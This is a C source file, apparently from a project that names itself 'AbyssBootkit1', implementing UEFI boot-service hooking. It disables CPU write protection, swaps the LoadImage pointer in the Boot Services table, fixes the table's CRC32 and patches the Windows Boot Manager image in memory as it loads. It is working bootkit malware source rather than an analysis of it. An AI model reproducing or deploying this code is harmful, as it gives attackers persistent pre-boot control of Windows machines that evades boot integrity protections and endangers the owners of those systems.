// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Patch/Hook Uefi
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiRuntimeServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Runtime Services Table. It simply exports the global variable gRT that is a pointer to the EFI Runtime Services Table as defined in the UEFI Specification. The global variable gRT must be preinitialized to NULL. The library constructor must set gRT to point at the EFI Runtime Services Table so it is available at the module's entry point. Since there is overhead in initializing this global variable, only those modules that actually require access to the EFI Runtime Services Table should use this library. Only available to DXE and UEFI module types.
#include <Library/UefiRuntimeServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/SynchronizationLib.h
// Provides synchronization functions.
#include <Library/SynchronizationLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/DevicePathLib.h
// Provides library functions to construct and parse UEFI Device Paths. This library provides defines, macros, and functions to help create and parse EFI_DEVICE_PATH_PROTOCOL structures.
#include <Library/DevicePathLib.h>



// START -> PROTOCOLS -------------------------------------------------------------------------------------------------------------------------
// START -> PROTOCOLS -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/LoadedImage.h
// UEFI 2.0 Loaded image protocol definition. Every EFI driver and application is passed an image handle when it is loaded. This image handle will contain a Loaded Image Protocol.
#include <Protocol/LoadedImage.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils02Registers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Functions01PatchHookWindowsBootManager.h>



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



EFI_EVENT Global_BootWindowsHookings_PatchHookUefi_EfiExitBootServicesEvent = NULL;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Hooks a service table pointer, replacing its original function with a new one.
	@details        This function modifies an entry in the EFI service table. It replaces the existing function pointed to by ServiceTableFunction with a new function provided by NewFunction. Additionally, it returns the address of the original function to allow for later restoration if needed.


	@param[in]      ServiceTableHeader          A pointer to the EFI service table header. This header is updated as part of the hooking process.
	@param[in]      ServiceTableFunction        A double reference to the EFI service table function. This argument is expected to point to the function to be replaced.
	@param[in]      NewFunction                 A pointer to the new function that will replace the existing function in the EFI service table.


	@retval         VOID*                       Returns a pointer to the original function that was in the service table before the modification.
**/
VOID*
BootWindowsHookings_FunctionsUefi_HookServiceTablePointer(
	IN              EFI_TABLE_HEADER            *ServiceTableHeader,
	IN              VOID                        **ServiceTableFunction,
	IN              VOID                        *NewFunction
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	BOOLEAN WpEnabled;


	// ---------------------------------------------------------------------------------------------------------------------
	// Raise TPL
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Raise TPL\r\n");

	// Raises a task’s priority level and returns its previous level.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-raisetpl
	EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);


	// ---------------------------------------------------------------------------------------------------------------------
	// Disable write protection
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Disable write protection\r\n");

	BootWindowsHookings_UtilsRegisters_DisableWriteProtection(&WpEnabled);


	// ---------------------------------------------------------------------------------------------------------------------
	// Exchange the service table pointer
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Exchange the service table pointer\r\n");


	// Performs an atomic compare exchange operation on a pointer value. Performs an atomic compare exchange operation on the pointer value specified by Value. If Value is equal to CompareValue, then Value is set to ExchangeValue and CompareValue is returned. If Value is not equal to CompareValue, then Value is returned. The compare exchange operation must be performed using MP safe mechanisms.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/SynchronizationLib.h#L269
	VOID* OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction, *ServiceTableFunction, NewFunction);


	// ---------------------------------------------------------------------------------------------------------------------
	// Update CRC32 in the service table header
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Update CRC32 in the service table header\r\n");

	ServiceTableHeader->CRC32 = 0;

	// Computes and returns a 32-bit CRC for a data buffer.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-calculatecrc32
	gBS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32);


	// ---------------------------------------------------------------------------------------------------------------------
	// Enable write protection
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Enable write protection\r\n");

	BootWindowsHookings_UtilsRegisters_EnableWriteProtection(WpEnabled);


	// ---------------------------------------------------------------------------------------------------------------------
	// Restore TPL
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Restore TPL\r\n");

	// Restores a task’s priority level to its previous value.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-restoretpl
	gBS->RestoreTPL(Tpl);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookServiceTablePointer) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return OriginalFunction;
}



/**
	@brief          Handles the ExitBootServices event, performing necessary cleanup and logging.
	@details        This function is invoked when the `ExitBootServices` event is triggered by the boot loader, marking the transition from the boot phase to the runtime phase. It performs the following actions:
	@details           - Closes the `ExitBootServices` event, as it is only called once during the boot process.
	@details           - Logs any buffered messages that were accumulated during the boot phase, ensuring that important information is captured before boot services are terminated.
	@details           - Logs a final message indicating the completion of this phase and the transition to runtime.
	@details           - Optionally stalls the system for a brief period to allow for any final operations or debugging before runtime begins.


	@param[in]      Event                       The event that triggered this callback, typically `ExitBootServices`.
	@param[in]      Context                     A pointer to event-specific context, which is unused in this function.


	@retval         None
**/
/*
VOID
BootWindowsHookings_FunctionsUefi_EventExitBootServices(
	IN              EFI_EVENT                   Event,
	IN              VOID*                       Context
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (EventExitBootServices) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Print all buffered messages
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"%s", Global_BootWindowsHookings_UtilsDebug_SaveHookingInfoBuffer);


	// ---------------------------------------------------------------------------------------------------------------------
	// The boot loader only calls ExitBootServices once so close this event now

	// Closes an event.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-closeevent
	gBS->CloseEvent(Global_BootWindowsHookings_PatchHookUefi_EfiExitBootServicesEvent);
	Global_BootWindowsHookings_PatchHookUefi_EfiExitBootServicesEvent = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (EventExitBootServices) - Bye\r\n");


	// Induces a fine-grained stall.
	// https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html?#efi-boot-services-stall
	gBS->Stall(20 * 1000000);
}
*/



/**
	@brief          Hooks and processes the Boot Service's LoadImage function.
	@details        This function serves as a custom hook for UEFI's LoadImage function. It performs additional processing before calling the original LoadImage function.


	@param[in]      BootPolicy                  Indicates the policy for loading the image. If TRUE, the image is loaded as a boot option; otherwise, it is loaded without boot option.
	@param[in]      ParentImageHandle           The handle of the image that is loading this image.
	@param[in]      DevicePath                  The pointer to the device path of the image.
	@param[in]      SourceBuffer                If not NULL, a pointer to the memory location containing a copy of the image to be loaded.
	@param[in]      SourceSize                  The size in bytes of SourceBuffer.
	@param[out]     ImageHandle                 The pointer where the handle of the loaded image will be returned.


	@retval         EFI_SUCCESS                 The image is successfully loaded.
	@retval         other                       An error occurred.
**/
EFI_STATUS
BootWindowsHookings_FunctionsUefi_HookgBSLoadImage(
	IN              BOOLEAN                     BootPolicy,
	IN              EFI_HANDLE                  ParentImageHandle,
	IN              EFI_DEVICE_PATH_PROTOCOL    *DevicePath,
	IN              VOID                        *SourceBuffer OPTIONAL,
	IN              UINTN                       SourceSize,
	OUT             EFI_HANDLE                  *ImageHandle
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;


	/*
	// ---------------------------------------------------------------------------------------------------------------------
	// Notification callback for ExitBootServices()
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Notification callback for ExitBootServices()\r\n");

	// Initialize a buffer to store log messages during the final hooks, when Boot Services and Print() are no longer available. The buffer will be printed later from the ExitBootServices event for debugging purposes.
	Status = BootWindowsHookings_UtilsDebug_InitializeEdgeBuffer(8192);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Buffer initialization failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}

	// It is necessary to create this event at this point because ExitBootServices() marks the last moment when boot services are still active. This is crucial for our process because during the boot process and the hooking operations, there are times when it's not possible to print messages to the screen. Therefore, by creating this event, we ensure that all messages generated during the boot and hooking phases can be output at the appropriate time, just before the boot services are terminated.

	// Creates an event in a group.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-createeventex
	// https://github.com/tianocore-docs/edk2-UefiDriverWritersGuide/blob/master/5_uefi_services/51_services_that_uefi_drivers_commonly_use/515_event_services.md
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, BootWindowsHookings_FunctionsUefi_EventExitBootServices, NULL, &gEfiEventExitBootServicesGuid, &Global_BootWindowsHookings_PatchHookUefi_EfiExitBootServicesEvent);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - gBS->CreateEventEx [gEfiEventExitBootServicesGuid] : %r (%llx).\r\n", Status, Status);
		return Status;
	}
	*/


	// ---------------------------------------------------------------------------------------------------------------------
	// Call original LoadImage function
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Call original LoadImage function\r\n");

	Status = Global_BootWindowsHookings_UtilsHooks_BSLoadImageOriginal(BootPolicy, ParentImageHandle, DevicePath, SourceBuffer, SourceSize, ImageHandle);

	// Failed
	if (EFI_ERROR(Status) || *ImageHandle == NULL)
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Global_BootWindowsHookings_UtilsHooks_BSLoadImageOriginal failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get loaded image info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Get loaded image info\r\n");

	// Queries a handle to determine if it supports a specified protocol. If the protocol is supported by the handle, it opens the protocol on behalf of the calling agent. This is an extended version of the EFI boot service EFI_BOOT_SERVICES.HandleProtocol().
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-openprotocol
	Status = gBS->OpenProtocol(*ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&LoadedImage, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
	LoadedImage->ParentHandle = NULL;

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - gBS->OpenProtocol [gEfiLoadedImageProtocolGuid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Image info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Image info\r\n");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"	-> FilePath = %llx\r\n", LoadedImage->FilePath);
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"		-> Text = %s\r\n", ConvertDevicePathToText(LoadedImage->FilePath, TRUE, TRUE));
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"	-> ImageBase = %llx\r\n", LoadedImage->ImageBase);
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"	-> ImageSize = %llx\r\n", LoadedImage->ImageSize);


	// ---------------------------------------------------------------------------------------------------------------------
	// Patch Windows Boot Manager
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Patch Windows Boot Manager\r\n");
	
	Status = BootWindowsHookings_FunctionsWindowsBootManager_PatchBootmgfwEfi(LoadedImage->ImageBase, LoadedImage->ImageSize);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - BootWindowsHookings_FunctionsWindowsBootManager_PatchBootmgfwEfi failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookUefi.c] (HookgBSLoadImage) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
